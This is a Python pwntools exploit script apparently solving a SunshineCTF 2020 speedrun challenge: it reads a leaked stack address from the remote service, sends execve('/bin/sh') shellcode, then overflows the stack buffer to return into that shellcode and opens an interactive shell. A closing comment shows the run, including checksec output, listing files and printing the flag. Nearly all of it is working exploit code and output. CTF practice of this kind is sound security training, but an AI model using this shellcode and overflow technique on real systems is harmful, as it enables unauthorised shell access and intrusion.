from pwn import *

p = remote('chal.2020.sunshinectf.org', 30006)
#p = process('./chall_06')

e = ELF('./chall_06')

p.readuntil(b': ')
leak = int( p.readuntil(b'\n', drop=True).ljust(8, b'\x00'), 16)

line = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p.send(line + b'\n')

p.readline()

print('LEAK: 0x%.8x' %(leak))

input('...')

line = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
line += b'\xcc'*(0x38-len(line))
line += p64(leak)
line += b'\n'

p.send(line)

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30006: Done
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_06'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
LEAK: 0x7ffc5c7a9b60
...
[*] Switching to interactive mode
$ ls
chall_06
flag.txt
$ cat flag.txt
sun{shepherd-of-fire-1a78a8e600bf4492}
'''
